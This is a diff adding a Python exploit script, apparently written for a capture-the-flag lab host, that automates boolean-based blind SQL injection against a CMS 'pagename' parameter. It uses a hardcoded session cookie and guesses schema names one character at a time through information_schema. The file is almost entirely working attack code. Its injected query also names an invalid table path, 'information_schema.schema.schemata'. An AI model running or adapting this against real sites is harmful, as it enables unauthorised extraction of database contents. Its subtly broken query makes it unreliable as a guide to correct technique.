@@ -1,0 +1,42 @@
+#!/usr/bin/python3
+
+from pwn import *
+import requests, signal, sys, time, string
+
+
+def signal_handler(sig, frame):
+    print('\n\n [!]exiting...\n')
+    sys.exit(1)
+
+signal.signal(signal.SIGINT,signal_handler)
+
+characters = string.ascii_lowercase + '_,' + string.digits
+mainURL = 'http://192.168.100.6/imfadministrator/cms.php?pagename='
+originalPayload = "home' or substring(database(),1,1)='a"
+
+
+def sqli():
+    #time.sleep(5)
+    headers = {
+        'Cookie': 'PHPSESSID=afffrjv54m80leu190ghi1i4f3'
+    }
+    data = ""
+    
+    p1 = log.progress("SQLI")
+    p1.status("Iniciadoo ataque SQL")
+    time.sleep(2)
+    p2 = log.progress("Data")
+    for position in range(1,100):
+         for character in characters:
+             
+             sql_url = mainURL + "home' or substring((select group_concat(schema_name) from information_schema.schema.schemata),%d,1)='%s" % (position, character)
+             r = requests.get(sql_url, headers=headers)
+             if " Under Construction. " not in r.text:
+                 data += character
+                 p2.status(data)
+                 break
+    p1.success("Finished")
+    p2.success(data)
+
+if __name__ == '__main__':
+    sqli()
